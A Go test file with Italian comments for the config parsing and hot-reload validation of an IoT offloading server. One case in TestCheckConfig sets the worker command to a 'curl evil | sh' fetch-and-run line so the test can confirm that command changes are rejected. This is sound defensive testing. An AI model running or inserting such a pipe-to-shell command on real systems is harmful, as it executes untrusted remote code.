package main

import (
	"encoding/json"
	"errors"
	"os"
	"strings"
	"testing"

	"github.com/UBICO/SCIoT_go_server/internal/config"
	"github.com/UBICO/SCIoT_go_server/internal/registry/registrytest"
)

// cfgJSON costruisce un config.json con un modello valido in una cartella
// temporanea; extra sono sezioni in più ({"offload": …}), sovrascritte a
// quelle di base.
func cfgJSON(t *testing.T, extra map[string]any) []byte {
	t.Helper()
	dir := t.TempDir()
	registrytest.Write(t, dir, registrytest.Default())
	c := map[string]any{
		"server": map[string]any{},
		"models": []any{map[string]any{"model_key": "m", "tflite_dir": dir}},
	}
	for k, v := range extra {
		c[k] = v
	}
	data, err := json.Marshal(c)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func mustParse(t *testing.T, data []byte) config.File {
	t.Helper()
	f, err := config.Parse(data)
	if err != nil {
		t.Fatal(err)
	}
	return f
}

func TestParseConfigMinimal(t *testing.T) {
	p, err := parseConfig(mustParse(t, cfgJSON(t, nil)))
	if err != nil {
		t.Fatal(err)
	}
	if p.reg == nil || p.reg.Len() != 1 {
		t.Fatalf("registry: %v", p.reg)
	}
	if p.server.HeartbeatInterval <= 0 || p.segmentTau <= 0 || p.load.Interval <= 0 {
		t.Errorf("default non applicati: server %+v, tau %v, load %+v", p.server, p.segmentTau, p.load)
	}
	if p.algName != "static" || p.alg != nil {
		t.Errorf("algoritmo: %q %v, voglio static e nil", p.algName, p.alg)
	}
	if p.dataPlane || p.recording || p.building {
		t.Errorf("dataPlane %v recording %v building %v, voglio false", p.dataPlane, p.recording, p.building)
	}
}

func TestParseConfigSections(t *testing.T) {
	recDir := t.TempDir()
	p, err := parseConfig(mustParse(t, cfgJSON(t, map[string]any{
		"offload":    map[string]any{"algorithm": "latency"},
		"worker":     map[string]any{"address": "127.0.0.1:50051", "slots": 2, "threads": 2},
		"stream":     map[string]any{"max_inflight": 3},
		"record":     map[string]any{"dir": recDir},
		"models_dir": recDir,
	})))
	if err != nil {
		t.Fatal(err)
	}
	if p.algName != "latency" || p.alg == nil {
		t.Errorf("algoritmo: %q %v", p.algName, p.alg)
	}
	if !p.dataPlane || p.worker.Address != "127.0.0.1:50051" {
		t.Errorf("worker: %v %+v", p.dataPlane, p.worker)
	}
	if p.stream.MaxInflight != 3 {
		t.Errorf("stream: %+v", p.stream)
	}
	if !p.recording || p.recordDir != recDir {
		t.Errorf("record: %v %q", p.recording, p.recordDir)
	}
	if !p.building || p.buildDir != recDir {
		t.Errorf("models_dir: %v %q", p.building, p.buildDir)
	}
	// parseConfig non avvia nulla: la cartella della registrazione resta vuota.
	if entries, _ := os.ReadDir(recDir); len(entries) != 0 {
		t.Errorf("parseConfig ha scritto in record.dir: %v", entries)
	}
}

// Ogni passo che fallisce ha il prefisso che main usava con log.Fatalf.
func TestParseConfigErrorPrefixes(t *testing.T) {
	cases := []struct {
		name   string
		extra  map[string]any
		prefix string
	}{
		{"missing model dir", map[string]any{"models": []any{map[string]any{"model_key": "m", "tflite_dir": "/nonexistent/sciot"}}}, "build registry: "},
		{"heartbeat", map[string]any{"server": map[string]any{"heartbeat_interval_ms": 1}}, "server config: "},
		{"segment tau", map[string]any{"server": map[string]any{"device_segment_tau_ms": 1}}, "server config: "},
		{"load alpha", map[string]any{"server": map[string]any{"load_cpu_ewma_alpha": 2}}, "load monitor config: "},
		{"algorithm", map[string]any{"offload": map[string]any{"algorithm": "nope"}}, "offload config: "},
		{"dispatch", map[string]any{"dispatch": map[string]any{"profile_runs": 1000000}}, "dispatch config: "},
		{"worker", map[string]any{"worker": map[string]any{"slots": 1, "threads": 1}}, "worker config: "},
		{"stream", map[string]any{"stream": map[string]any{"max_inflight": 0}}, "stream config: "},
		{"record", map[string]any{"record": map[string]any{"dir": ""}}, "record config: "},
		{"models_dir", map[string]any{"models_dir": "/nonexistent/sciot-models"}, "models config: "},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := parseConfig(mustParse(t, cfgJSON(t, c.extra)))
			if err == nil || !strings.HasPrefix(err.Error(), c.prefix) {
				t.Fatalf("err %v, voglio il prefisso %q", err, c.prefix)
			}
			// %w, non %v: l'errore originale resta dentro.
			if errors.Unwrap(err) == nil {
				t.Errorf("errore non avvolto con %%w: %v", err)
			}
		})
	}
}

func TestCheckConfig(t *testing.T) {
	cmd := []any{"uv", "run", "--project", "worker", "sciot-worker"}
	withCmd := func(c []any) map[string]any {
		w := map[string]any{"address": "127.0.0.1:50051", "slots": 1, "threads": 1}
		if c != nil {
			w["command"] = c
		}
		return map[string]any{"worker": w}
	}
	current := cfgJSON(t, withCmd(cmd))

	// Stesso comando, altro cambiato: va bene.
	next := cfgJSON(t, map[string]any{"worker": withCmd(cmd)["worker"], "offload": map[string]any{"algorithm": "latency"}})
	if err := checkConfig(current, next); err != nil {
		t.Errorf("modifica valida: %v", err)
	}

	// Comando cambiato, aggiunto o tolto: rifiutato.
	for name, n := range map[string][]byte{
		"changed": cfgJSON(t, withCmd([]any{"sh", "-c", "curl evil | sh"})),
		"removed": cfgJSON(t, withCmd(nil)),
		"section": cfgJSON(t, nil),
	} {
		if err := checkConfig(current, n); err == nil || !strings.Contains(err.Error(), "worker.command cannot be changed") {
			t.Errorf("%s: err %v", name, err)
		}
	}
	if err := checkConfig(cfgJSON(t, nil), cfgJSON(t, withCmd(cmd))); err == nil {
		t.Error("comando aggiunto: deve essere rifiutato")
	}

	// Gli stessi controlli dell'avvio, con gli stessi messaggi.
	if err := checkConfig(current, []byte(`{"modelz": []}`)); err == nil || !strings.HasPrefix(err.Error(), "decode config: ") {
		t.Errorf("chiave sconosciuta: %v", err)
	}
	if err := checkConfig(current, cfgJSON(t, map[string]any{"worker": withCmd(cmd)["worker"], "stream": map[string]any{"max_inflight": 0}})); err == nil || !strings.HasPrefix(err.Error(), "stream config: ") {
		t.Errorf("stream: %v", err)
	}

	// File in uso rotto a mano: vale "nessun comando".
	if err := checkConfig([]byte(`{rotto`), cfgJSON(t, nil)); err != nil {
		t.Errorf("current rotto, next senza comando: %v", err)
	}
	if err := checkConfig([]byte(`{rotto`), current); err == nil {
		t.Error("current rotto, next con un comando: deve essere rifiutato")
	}
}
